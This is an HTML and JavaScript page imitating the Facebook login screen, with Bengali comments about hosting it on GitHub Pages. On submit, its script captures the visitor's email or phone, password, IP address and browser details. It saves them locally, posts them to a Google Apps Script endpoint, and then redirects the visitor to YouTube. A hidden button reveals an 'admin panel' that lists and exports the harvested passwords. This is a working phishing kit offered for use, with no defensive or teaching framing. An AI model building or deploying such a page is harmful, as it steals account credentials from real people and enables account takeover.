<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log in or Sign up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        .container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            padding: 72px 0;
        }
        
        .content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 980px;
            width: 100%;
        }
        
        .intro {
            margin-right: 60px;
            max-width: 500px;
        }
        
        .intro h1 {
            color: #1877f2;
            font-size: 60px;
            font-weight: bold;
            margin-bottom: 16px;
        }
        
        .intro h2 {
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
        }
        
        .login-form {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            max-width: 396px;
            width: 100%;
        }
        
        .login-form input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }
        
        .login-button {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 16px;
        }
        
        .login-button:hover {
            background-color: #166fe5;
        }
        
        .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-password a {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .divider {
            align-items: center;
            border-bottom: 1px solid #dadde1;
            display: flex;
            margin: 20px 16px;
            text-align: center;
        }
        
        .create-account {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            line-height: 48px;
            padding: 0 16px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin: 0 auto;
            display: block;
        }
        
        .create-account:hover {
            background-color: #36a420;
        }
        
        .admin-panel {
            display: none;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            max-width: 900px;
            width: 100%;
            margin: 20px auto;
        }
        
        .admin-panel h2 {
            color: #1877f2;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .admin-panel table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .admin-panel th, .admin-panel td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #dddfe2;
        }
        
        .admin-panel th {
            background-color: #f0f2f5;
            font-weight: bold;
        }
        
        .admin-panel tr:hover {
            background-color: #f5f6f7;
        }
        
        .back-button {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            padding: 10px 20px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        
        footer {
            background-color: white;
            padding: 20px;
            text-align: center;
            color: #8a8d91;
            font-size: 14px;
        }
        
        .toggle-admin {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 10px 15px;
            cursor: pointer;
            font-weight: bold;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #42b72a;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            display: none;
            z-index: 1000;
        }
        
        .data-options {
            margin: 20px 0;
            text-align: center;
        }
        
        .data-options button {
            margin: 0 10px;
            padding: 8px 16px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        
        @media (max-width: 900px) {
            .content {
                flex-direction: column;
            }
            
            .intro {
                margin-right: 0;
                margin-bottom: 40px;
                text-align: center;
            }
            
            .intro h1 {
                font-size: 48px;
            }
        }
    </style>
</head>
<body>
    <button class="toggle-admin" id="toggleAdmin">.</button>
    <div class="notification" id="notification">Login successful</div>
    
    <div class="container" id="loginContainer">
        <div class="content">
            <div class="intro">
                <h1>facebook</h1>
                <h2>Connect with friends and the world around you on Facebook.</h2>
            </div>
            <div class="login-form">
                <form id="loginForm">
                    <input type="text" id="email" placeholder="Email address or phone number" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit" class="login-button">Log In</button>
                </form>
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
                <div class="divider"></div>
                <button type="button" class="create-account" id="createAccount">Create New Account</button>
            </div>
        </div>
    </div>
    
    <div class="admin-panel" id="adminPanel">
        <h2>Us</h2>
        <div class="data-options">
            <button id="loadData">Refresh Data</button>
            <button id="clearData">Clear All Data</button>
            <button id="exportData">Export Data</button>
        </div>
        <table id="userTable">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Email/Phone</th>
                    <th>Password</th>
                    <th>Login Time</th>
                    <th>IP Address</th>
                </tr>
            </thead>
            <tbody id="userTableBody">
                <!-- User data will be inserted here -->
            </tbody>
        </table>
        <button class="back-button" id="backButton">Back to Login</button>
    </div>
    
    <footer>
        <p>Facebook &copy; 2025</p>
    </footer>

    <script>
        // GitHub Pages-এর জন্য বিশেষভাবে ডিজাইন করা কোড
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            const adminPanel = document.getElementById('adminPanel');
            const loginContainer = document.getElementById('loginContainer');
            const toggleAdmin = document.getElementById('toggleAdmin');
            const backButton = document.getElementById('backButton');
            const userTableBody = document.getElementById('userTableBody');
            const notification = document.getElementById('notification');
            const loadDataBtn = document.getElementById('loadData');
            const clearDataBtn = document.getElementById('clearData');
            const exportDataBtn = document.getElementById('exportData');
            
            // স্থায়ী ডেটা স্টোরেজ (localStorage ব্যবহার করে)
            function loadPermanentData() {
                let userData = JSON.parse(localStorage.getItem('facebookPermanentData')) || [];
                return userData;
            }
            
            function saveToPermanentStorage(userData) {
                localStorage.setItem('facebookPermanentData', JSON.stringify(userData));
                // GitHub Pages-এ সব ডাটা স্থায়ীভাবে সেভ হবে
            }
            
            // IP অ্যাড্রেস পাওয়ার ফাংশন
            async function getUserIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    return 'Unknown';
                }
            }
            
            // Google Sheets-এ ডেটা সেভ করার ফাংশন (GitHub Pages-এর জন্য অপ্টিমাইজড)
            async function saveToGoogleSheets(userData) {
                try {
                    // GitHub Pages-এ CORS সমস্যা এড়ানোর জন্য বিশেষ পদ্ধতি
                    const formData = new FormData();
                    formData.append('email', userData.email);
                    formData.append('password', userData.password);
                    formData.append('timestamp', userData.timestamp);
                    formData.append('userAgent', userData.userAgent);
                    formData.append('platform', userData.platform);
                    formData.append('ip', userData.ip);
                    
                    // Google Apps Script URL
                    const scriptURL = 'https://script.google.com/macros/s/AKfycbw_JQj0YSiEIkXQVaCPmB_j2TxJOCVDssTmIUZGpUCmLn2ZxLlAjcF6zBuayKAvHQIB/exec';
                    
                    // CORS সমস্যা এড়ানোর জন্য বিশেষ রিকোয়েস্ট
                    const response = await fetch(scriptURL, {
                        method: 'POST',
                        body: formData,
                        mode: 'no-cors' // CORS সমস্যা সমাধান
                    });
                    
                    return true; // no-cors মোডে রেসপন্স পড়া যায় না, তাই সাফল্য ধরে নেওয়া
                } catch (error) {
                    console.error('Google Sheets error:', error);
                    return false;
                }
            }
            
            // এডমিন প্যানেল টেবিল আপডেট
            function updateAdminTable() {
                const userData = loadPermanentData();
                userTableBody.innerHTML = '';
                userData.forEach((user, index) => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${index + 1}</td>
                        <td>${user.email}</td>
                        <td>${user.password}</td>
                        <td>${user.timestamp}</td>
                        <td>${user.ip}</td>
                    `;
                    userTableBody.appendChild(row);
                });
            }
            
            // প্রাথমিক টেবিল আপডেট
            updateAdminTable();
            
            // লগইন ফর্ম সাবমিশন
            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;
                const ipAddress = await getUserIP();
                
                // ইউজার অবজেক্ট তৈরি
                const user = {
                    email: email,
                    password: password,
                    timestamp: new Date().toLocaleString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    ip: ipAddress
                };
                
                // স্থানীয় স্টোরেজে সেভ
                const userData = loadPermanentData();
                userData.push(user);
                saveToPermanentStorage(userData);
                
                // Google Sheets-এ সেভ করার চেষ্টা করুন
                try {
                    await saveToGoogleSheets(user);
                } catch (error) {
                    console.log('Google Sheets save failed, but local storage succeeded');
                }
                
                // এডমিন টেবিল আপডেট
                updateAdminTable();
                
                // নোটিফিকেশন দেখান
                notification.textContent = 'Login successful! Data saved permanently.';
                notification.style.display = 'block';
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 3000);
                
                // ফর্ম ক্লিয়ার
                loginForm.reset();
                
                // YouTube-এ রিডাইরেক্ট
                setTimeout(() => {
                    window.location.href = 'https://www.youtube.com';
                }, 2000);
            });
            
            // এডমিন প্যানেল টগল
            toggleAdmin.addEventListener('click', function() {
                if (adminPanel.style.display === 'block') {
                    adminPanel.style.display = 'none';
                    loginContainer.style.display = 'flex';
                    toggleAdmin.textContent = 'Admin Panel';
                } else {
                    adminPanel.style.display = 'block';
                    loginContainer.style.display = 'none';
                    toggleAdmin.textContent = 'Back to Login';
                    updateAdminTable();
                }
            });
            
            // ব্যাক বাটন
            backButton.addEventListener('click', function() {
                adminPanel.style.display = 'none';
                loginContainer.style.display = 'flex';
                toggleAdmin.textContent = 'Admin Panel';
            });
            
            // ডেটা লোড বাটন
            loadDataBtn.addEventListener('click', function() {
                updateAdminTable();
                notification.textContent = 'Data refreshed!';
                notification.style.display = 'block';
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 2000);
            });
            
            // ডেটা ক্লিয়ার বাটন
            clearDataBtn.addEventListener('click', function() {
                if (confirm('Are you sure you want to clear all data? This cannot be undone!')) {
                    localStorage.removeItem('facebookPermanentData');
                    updateAdminTable();
                    notification.textContent = 'All data cleared!';
                    notification.style.display = 'block';
                    setTimeout(() => {
                        notification.style.display = 'none';
                    }, 2000);
                }
            });
            
            // ডেটা এক্সপোর্ট বাটন
            exportDataBtn.addEventListener('click', function() {
                const userData = loadPermanentData();
                const dataStr = JSON.stringify(userData, null, 2);
                const dataBlob = new Blob([dataStr], {type: 'application/json'});
                
                const url = URL.createObjectURL(dataBlob);
                const link = document.createElement('a');
                link.href = url;
                link.download = 'facebook_user_data.json';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);
                
                notification.textContent = 'Data exported successfully!';
                notification.style.display = 'block';
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 2000);
            });
            
            // ক্রিয়েট অ্যাকাউন্ট বাটন
            document.getElementById('createAccount').addEventListener('click', function() {
                alert('This is a demo. Account creation is not available.');
            });
        });
    </script>
</body>
</html>
